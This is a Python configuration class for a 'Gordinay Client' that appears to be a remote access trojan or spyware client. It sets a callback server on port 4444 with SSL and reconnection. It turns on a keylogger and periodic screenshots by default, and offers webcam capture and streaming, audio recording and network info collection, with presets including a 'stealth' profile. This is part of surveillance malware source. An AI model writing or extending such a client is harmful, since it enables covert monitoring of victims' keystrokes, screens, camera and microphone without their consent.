class ClientAppConfig:
    '''Client Application Configuration'''
    def __init__(self):
        self.APP_NAME = "Gordinay Client"
        self.VERSION = "1.0.0"

        self.server_host = "127.0.0.1" # Server IP address
        self.server_port = 4444      # Server port
        self.use_ssl = True         # Use SSL/TLS for socket communication
        self.reconnect_delay = 5    # Seconds between reconnection attempts

        self.keylogger_enabled = True # Enable keylogger feature
        self.keylogger_interval = 5  # seconds between keylogger uploads

        self.webcam_snapshot_enabled = False  # Enable webcam snapshot feature
        self.webcam_movement_enabled = False # Enable webcam motion detection
        self.webcam_interval = 30  # seconds between snapshots
        
        self.webcam_stream_enabled = False  # Disable webcam streaming feature by defaul
        self.webcam_stream_motion_only = False  # Only send frames when motion detected
        self.webcam_stream_fps = 10  # Frames per second for webcam streaming
        self.webcam_stream_resolution = (640, 480)  # Resolution for webcam streaming
        self.webcam_stream_quality = 60  # JPEG quality for webcam streaming
        
        self.screenshot_enabled = True  # Enable screenshot feature
        self.screenshot_interval = 60  # seconds between screenshots
        self.screenshot_quality = 85  # JPEG quality for screenshots


        self.network_info_enabled = True  # Enable network information collection
        self.screenshot_change_detection = True  # Enable change detection for screenshots
        self.network_info_track_changes = True  # Only log when network configuration changes
        self.network_info_interval = 300  # seconds between network checks

        self.audio_enabled = False  # Disabled by default
        self.audio_duration = 10    # Time recording duration (seconds)
        self.audio_interval = 60  # Interval between recordings (seconds)
    
    def get_config(self):
        """
        Get all configurable parameters
        Returns:
            dict: Configuration dictionary
        """
        return {
            'keylogger_interval': self.keylogger_interval,
            'webcam_interval': self.webcam_interval,
            'webcam_stream_fps': self.webcam_stream_fps,
            'webcam_stream_resolution': self.webcam_stream_resolution,
            'webcam_stream_quality': self.webcam_stream_quality,
            'screenshot_interval': self.screenshot_interval,
            'screenshot_quality': self.screenshot_quality,
            'network_info_interval': self.network_info_interval,
            'audio_duration': self.audio_duration,
            'audio_interval': self.audio_interval,
            
            # Features status
            'features': {
                'keylogger': self.keylogger_enabled,
                'webcam_snapshot': self.webcam_snapshot_enabled,
                'webcam_stream': self.webcam_stream_enabled,
                'screenshot': self.screenshot_enabled,
                'network_info': self.network_info_enabled,
                'audio': self.audio_enabled
            }
        }
    
    def set_config(self, param, value):
        """
        Set a configuration parameter
        Args:
            param: Parameter name
            value: New value
        Returns:
            bool: True if successful
        """
        try:
            # Validate and convert value
            if param in ['keylogger_interval', 'webcam_interval', 'screenshot_interval', 
                        'network_info_interval', 'audio_duration', 'audio_interval',
                        'webcam_stream_fps', 'webcam_stream_quality', 'screenshot_quality']:
                value = int(value)
            
            elif param == 'webcam_stream_resolution':
                # Parse resolution like "640x480" or "(640, 480)"
                if isinstance(value, str):
                    if 'x' in value:
                        width, height = value.split('x')
                        value = (int(width), int(height))
                    else:
                        value = tuple(map(int, value.strip('()').split(',')))
            
            # Set the value
            if hasattr(self, param):
                setattr(self, param, value)
                print(f"[+] Config updated: {param} = {value}")
                return True
            else:
                print(f"[!] Unknown parameter: {param}")
                return False
        
        except Exception as e:
            print(f"[!] Error setting config: {e}")
            return False
    
    def load_profile(self, profile_name):
        """
        Load a predefined configuration profile
        Args:
            profile_name: Name of the profile
        Returns:
            bool: True if successful
        """
        profiles = {
            'stealth': {
                'keylogger_interval': 10,
                'webcam_interval': 300,
                'screenshot_interval': 300,
                'webcam_stream_fps': 5,
                'webcam_stream_quality': 40,
                'screenshot_quality': 60,
                'network_info_interval': 600,
                'audio_duration': 5,
                'audio_interval': 300
            },
            'performance': {
                'keylogger_interval': 2,
                'webcam_interval': 10,
                'screenshot_interval': 20,
                'webcam_stream_fps': 30,
                'webcam_stream_quality': 90,
                'screenshot_quality': 95,
                'network_info_interval': 60,
                'audio_duration': 30,
                'audio_interval': 30
            },
            'balanced': {
                'keylogger_interval': 5,
                'webcam_interval': 30,
                'screenshot_interval': 60,
                'webcam_stream_fps': 10,
                'webcam_stream_quality': 60,
                'screenshot_quality': 85,
                'network_info_interval': 300,
                'audio_duration': 10,
                'audio_interval': 60
            },
            'minimal': {
                'keylogger_interval': 30,
                'webcam_interval': 600,
                'screenshot_interval': 600,
                'webcam_stream_fps': 3,
                'webcam_stream_quality': 30,
                'screenshot_quality': 50,
                'network_info_interval': 1800,
                'audio_duration': 5,
                'audio_interval': 600
            }
        }
        
        if profile_name in profiles:
            profile = profiles[profile_name]
            
            print(f"[+] Loading profile: {profile_name}")
            
            for param, value in profile.items():
                setattr(self, param, value)
                print(f"    {param} = {value}")
            
            return True
        else:
            print(f"[!] Unknown profile: {profile_name}")
            return False
        